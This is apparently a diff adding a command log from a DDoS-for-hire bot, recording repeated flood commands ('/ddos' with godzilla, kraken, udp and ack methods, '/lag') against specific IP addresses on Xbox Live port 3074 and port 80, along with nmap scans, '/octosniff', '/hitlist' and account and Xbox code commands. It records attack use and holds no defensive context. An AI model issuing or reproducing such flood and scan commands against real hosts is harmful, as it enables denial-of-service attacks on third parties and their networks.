@@ -1,0 +1,44 @@
+/help
+/ping 98.4.81.169
+/methods
+/DDoS
+/DDoS godzilla std 98.4.81.169 30038
+/ddos imgur std 98.4.81.169 30 3074
+/serverinfo
+/ddos godzilla std 98.4.81.169 30 3074
+/ddos godzilla ack 98.4.81.169 25 3074
+/ddos udp 98.4.81.169 3074 30
+/ddos Kraken 98.4.81.169 3074 30
+/ddos kraken udp 98.4.81.169 3074 300
+/Xboxcode
+/vpn
+/vpn
+/vpn
+/ping 98.4.81.169
+/ddos kraken udp 108.24.50.3 600 80
+/accounts
+/xboxcode
+/vpn
+/octosniff
+/plan
+/hitlist
+/nmapsv IP_ADDRESS {PORT}
+/nmapsv IP_ADDRESS
+/claim KEY
+/nmapsv IP_ADDRESS {3074}
+/tr4p
+/info
+/serverinfo
+/nmapsv 98.4.81.169
+/lag
+/lag std 98.4.81.169 30 300 200
+/plans
+/plan
+/show plan
+/getplan
+/bugbounty
+/high level bug/exploit = 24+ Hours
+[Fri Jul 31 2020 02:29:52 GMT-1100 (Samoa Standard Time)] /account
+[Fri Jul 31 2020 02:30:09 GMT-1100 (Samoa Standard Time)] /accounts
+[Fri Jul 31 2020 02:30:21 GMT-1100 (Samoa Standard Time)] /vpn
+[Fri Jul 31 2020 02:51:53 GMT-1100 (Samoa Standard Time)] /vpn
